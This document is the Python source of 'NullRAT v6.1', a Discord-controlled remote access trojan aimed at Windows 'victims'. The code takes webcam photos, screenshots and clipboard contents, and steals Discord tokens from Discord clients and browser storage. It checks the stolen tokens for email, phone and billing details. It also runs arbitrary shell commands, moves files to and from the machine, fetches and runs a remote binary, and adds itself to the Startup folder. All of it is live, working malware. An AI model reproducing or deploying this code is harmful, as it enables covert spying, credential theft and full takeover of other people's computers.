from Variables import *

from mss import mss
from requests import get
from discord import Embed
from base64 import decodebytes
from socket import create_connection
import discord, os, subprocess, re, time

client, original_dir = discord.Bot(), os.getcwd()
# try: os.mkdir(os.path.join(f"C:\\Users\\{os.getenv('username')}", ".games"))
# except FileExistsError: pass
nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata"

@client.event
async def on_ready():
    await client.get_channel(notification_channel).send(
        embed=Embed(title = f"NullRAT v6.1 started on {IP()}\nCurrently present in {original_dir}")
    )

# Intelligence Gathering #
@client.slash_command(description="Finds the IP address of victim", guild_ids=server_ids)
async def getip(ctx):
    await ctx.respond(
        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
    )

@client.slash_command(description="Finds the values of environment variables", guild_ids=server_ids)
async def getenv(ctx, environment_var):
    value = os.getenv(environment_var)
    if len(value) >= 1023:
        return await ctx.respond(f"The value for {environment_var} is:\n```{value}```")
    await ctx.respond(
        embed = EmbedGen(
            "__Get Environment Variable__", 
            "The value for " + environment_var + " is: ",
            "```" + value + "```"
        )
    )

@client.slash_command(description="Finds all geolocation information of victim", guild_ids=server_ids)
async def geolocate(ctx):
    data = get("http://ip-api.com/json/").json()
    embed = discord.Embed(
        title="Geolocation Information \n(Powered by ip-api)", color=0x0081FA
    )
    if data["status"] == "fail": return await ctx.send("```Unable to get Geolocation Info!```")
    embed.add_field(name="Country name", value=f"{data['country']} ({data['countryCode']})", inline=True)
    embed.add_field(name="City", value=data["city"], inline=True)
    embed.add_field(name="Region", value=data["regionName"], inline=True)
    embed.add_field(name="Latitude", value=data["lat"], inline=True)
    embed.add_field(name="Longitude", value=data["lon"], inline=True)
    embed.add_field(name="Zip code", value=data["zip"], inline=True)
    embed.add_field(name="ISP", value=data["isp"], inline=True)
    embed.set_footer(text="Written by NullCode1337#5386")
    await ctx.respond(embed=embed)

@client.slash_command(description="Capture image from webcam", guild_ids=server_ids)  
async def webcam(ctx):
    await ctx.defer()
    webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
    os.chdir(nr_working)
    with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
    subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    await ctx.interaction.followup.send(
        embed=discord.Embed(title="Here is the photo:", color=0x0081FA), 
        file=discord.File(nr_working + "\\image.png")
    )
    os.remove(nr_working + "\\image.png")
    os.remove(nr_working + "\\cc.exe")
    os.chdir(original_dir)

@client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
async def raw_tokens(ctx):
    await ctx.defer()
    message, tokens = "", list(dict.fromkeys(find_token()))
    for token in tokens: 
        message += token + "\n"
    if len(message) >= 1023: 
        return await ctx.interaction.followup.send("```" + message + "```")
    embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
    await ctx.interaction.followup.send(embed=embed)

@client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
async def checked_tokens(ctx):
    await ctx.defer()
    msg, valid, email, phone, uname, nitro, bill = "", [], [], [], [], [], []

    for token in list(dict.fromkeys(find_token())):
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
        if requ.status_code == 401: continue
        if requ.status_code == 200:
            json = requ.json()
            valid.append(str(token))
            email.append(str(json['email']))
            phone.append(str(json['phone']))
            uname.append(f'{json["username"]}#{json["discriminator"]} [{str(json["id"])}]')  
            nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
            bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
            continue
            
    await ctx.interaction.followup.send("```ini\n[Checked Tokens from NullRAT]```")
    if len(valid) == 0: 
        return await ctx.interaction.channel.send(embed = Embed(title="No valid Discord Tokens"))
    
    for tk, em, ph, un, ni, bi in zip(valid, email, phone, uname, nitro, bill): 
      msg += f"```{str(tk)}:\nUsername: {str(un)}\nEmail Address: {str(em)}\nPhone Number: {str(ph)}\nNitro Status: {str(ni)}\nBilling Info: {str(bi)}```\n\n"
    
    if len(msg) >= 1999: 
        m2 = msg.split("\n\n")
        for a in m2:
            await ctx.interaction.channel.send(a)
    else:
        return await ctx.interaction.channel.send(msg.replace("\n\n", ""))
    
@client.slash_command(description="Sends General System Information", guild_ids=server_ids)
async def gsl(ctx):
    await ctx.defer()
    subprocess.run(
        f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
    )
    await ctx.interaction.followup.send(
        "Here is the file", 
        file=discord.File(nr_working + "\\youtube.txt", filename="General Output.txt"), 
    )
    os.remove(nr_working + "\\youtube.txt")

@client.slash_command(description="Sends screenshot of entire monitor", guild_ids=server_ids)
async def screenshot(ctx): 
    await ctx.defer()
    with mss() as sct: sct.shot(output=nr_working+"\\monitor.png")
    file = discord.File(nr_working + "\\monitor.png")
    await ctx.interaction.followup.send(file=file)
    time.sleep(2)
    os.remove(nr_working + "\\monitor.png")

@client.slash_command(description="Sends text contents of clipboard", guild_ids=server_ids)
async def clipboard(ctx): 
    outp = subprocess.run(
            "PowerShell Get-Clipboard", 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE
        ).stdout.decode("CP437")
    await ctx.respond(f"```{outp}```" if outp != "" else "No text in clipboard!")

# Directory Manipulation #
@client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
async def getcwd(ctx):
    await ctx.respond(embed=EmbedGen("Current directory", "The present directory is: ", os.getcwd()))

@client.slash_command(description="Uploads file to victim's PC", guild_ids=server_ids)
async def upload(ctx, file_name, url):
    r = get(url, allow_redirects=True)
    with open(file_name, "wb") as f: 
        f.write(r.content)
    await ctx.respond(embed=EmbedGen("Download information", "Sending file to victim: ", "Success"))

@client.slash_command(description="Downloads file from victim's PC", guild_ids=server_ids)
async def download(ctx, file_path):
    await ctx.defer()
    try:
        file=discord.File(file_path)
        return await ctx.interaction.followup.send(embed = Embed(title="__Downloaded file from PC:__", color = 0x0081FA), file=file)
    except FileNotFoundError:
        return await ctx.interaction.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
    except PermissionError:
        return await ctx.interaction.followup.send(embed=EmbedGen("Error while downloading!", "PermissionError", "Please specify a different path and try again"))
        
@client.slash_command(description="Change directory to specified location", guild_ids=server_ids)
async def change_directory(ctx, directory):
    try:
        os.chdir(directory)
        return await ctx.respond(embed=EmbedGen("CD information",  "Changing directory to " + os.getcwd(), "Success"))
    except FileNotFoundError:
        await ctx.respond(embed=EmbedGen("CD information", "Changing directory failed!", "```Error: Incorrect Path```"))
        
@client.slash_command(description="Finds contents of directory", guild_ids=server_ids)
async def listdir(ctx, directory_to_find="null"):
    if directory_to_find == "null":
        directory_to_find = os.getcwd()
        subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    else:
        try: os.chdir(dire)
        except: return await ctx.send(embed=Embed(title="Invalid directory! Please try again :)"))
        subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    file = discord.File(
        os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
    )
    await ctx.respond("Contents of dir " + directory_to_find + " are:", file=file)
    os.remove(nr_working + "\\dir.txt")
    os.chdir(original_dir)

# Misc. Commands #
@client.slash_command(description="Add NullRAT to startup directory", guild_ids=server_ids)
async def startup(ctx):
    from sys import executable; msg = "```\n"
    await ctx.respond(embed = Embed(title = "Last known RAT directory: \n" + original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), color = 0x0081FA))
    os.chdir(original_dir)
    await ctx.interaction.followup.send(embed = Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
    subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    for value in os.listdir(): msg += f'{value}\n'
    msg += "```"; await ctx.interaction.followup.send(msg, embed=Embed(title="If you see the program here, you're good to go: ", color=0x0081FA))
    
@client.slash_command(description="Executes shell commands", guild_ids=server_ids)
async def shell(ctx, msg): 
    await ctx.defer()
    global status; status = None
    from threading import Thread
    def shell():
        output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        global status; status = "ok"; return output
    shel = Thread(target=shell); shel._running = True; shel.start()
    time.sleep(2); shel._running = False
    if status:
        result = str(shell().stdout.decode("CP437"))
        print(result)
        numb = len(result)
        print(numb)
        if numb < 1:
            return await ctx.interaction.followup.send(
                embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
            )
        elif numb > 1990:
            os.chdr(nr_working)
            f1 = open("shell.txt", "a")
            f1.write(result)
            f1.close()
            file = discord.File("shell.txt", filename="shell.txt")
            return await ctx.interaction.followup.send("Command successfully executed", file=file)
            os.popen("del shell.txt")
        else:
            return await ctx.interaction.followup.send(f"```{result}```")
    else:
        await ctx.interaction.followup.send(
            embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
        )
        status = None

@client.slash_command(description="Quits NullRAT from specified IP", guild_ids=server_ids)
async def close(ctx, ip):
    if ip == IP():
        await ctx.respond(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
        await client.close()
    if "." not in ip:
        return await ctx.respond(embed=EmbedGen("Information", "Given IP is incorrect!", "Please try again"))  
        
@client.slash_command(description="Quits all instances of NullRAT", guild_ids=server_ids)
async def close_all(ctx):
    await ctx.respond("Are you sure?", view=closeall_confirm())
      
class closeall_confirm(discord.ui.View):
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
    async def first_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.channel.send(embed=Embed(title="Closing all instances of NullRAT...")) 
        await client.close()
        
    @discord.ui.button(label="No", style=discord.ButtonStyle.primary)
    async def second_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
        
# Required Functions
def IP():
    try: return get("http://icanhazip.com/").text.rstrip()
    except: return "127.0.0.1"

def is_connected():
    try: create_connection(("1.1.1.1", 53)); return True
    except OSError: return False

def EmbedGen(title_main, name, value):
    color = 0x0081FA
    embed = Embed(title=title_main, color=color)
    embed.add_field(name=name, value=value)
    embed.set_footer(text="Written by NullCode1337#5386")
    return embed

def find_token():
    tokens = tokens2 = []
    local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",                                "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",                         "Lightcord": roaming + "\\Lightcord",
        "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
    }
    for platform, path in paths.items():
        path += '\\Local Storage\\leveldb'
        try: 
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line): 
                            tokens.append(token)
        except FileNotFoundError: continue
    return tokens
    
while is_connected() == False: 0
client.run(bot_token)
